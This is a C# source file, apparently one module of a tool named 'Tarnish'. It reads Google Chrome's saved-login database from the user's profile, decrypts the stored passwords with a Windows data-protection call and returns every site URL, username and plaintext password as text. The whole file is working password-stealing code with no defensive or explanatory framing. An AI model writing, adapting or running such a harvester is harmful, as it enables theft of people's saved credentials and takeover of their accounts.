using System;
using System.Collections.Generic;
using System.IO;
using System.Data.SQLite;

namespace Tarnish
{
    class ProcChrome : Proc
    {
        public string GetPasswords()
        {
            try
            {
                string DBPATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\User Data\Default\Login Data";
                string FileOut = "";
                if (File.Exists(DBPATH))
                {
                    string header = "Tarnish " + Global.assemName.Version.ToString();
                    Global.WriteLine(header);
                    FileOut += header + Environment.NewLine;
                    using (SQLiteConnection DB_Connection = new SQLiteConnection("Data Source=" + DBPATH + ";Version=3;"))
                    {
                        DB_Connection.Open();
                        List<ChromeUserPassEntity> entities = new List<ChromeUserPassEntity>();
                        using (SQLiteCommand cmd = DB_Connection.CreateCommand())
                        {
                            cmd.CommandText = "SELECT origin_url,username_value,password_value FROM LOGINS";
                            SQLiteDataReader dr = cmd.ExecuteReader();
                            if (dr.HasRows)
                                while (dr.Read())
                                    entities.Add(new ChromeUserPassEntity(dr.GetValue(0).ToString(), dr.GetValue(1).ToString(), (byte[])dr.GetValue(2)));
                        }
                        foreach (ChromeUserPassEntity e in entities)
                            if (e.username_value.Trim().Length > 0)
                            {
                                Global.WriteLine(e.origin_url);
                                FileOut += e.origin_url + Environment.NewLine + "   " + e.username_value + Environment.NewLine + "   " + e.getPassword() + Environment.NewLine;
                            }
                        DB_Connection.Close();
                    }
                    return FileOut;
                }
            }
            catch { }
            return "";
        }
        public string Name { get { return "Chrome"; } }
        class ChromeUserPassEntity
        {
            private string _origin_url;
            private string _username_value;
            private byte[] _password_value;
            public string origin_url { get { return _origin_url; } set { _origin_url = value; } }
            public string username_value { get { return _username_value; } set { _username_value = value; } }
            public byte[] password_value { get { return _password_value; } set { _password_value = value; } }
            public string getPassword()
            {
                byte[] output = Global.UnprotectData(_password_value, 1);
                string toreturn = "";
                for (int i = 0; i < output.Length; i++)
                    toreturn += (char)output[i];
                return toreturn;
            }
            public ChromeUserPassEntity(string url, string user, byte[] pass)
            { _origin_url = url; _username_value = user; _password_value = pass; }
        }
    }
}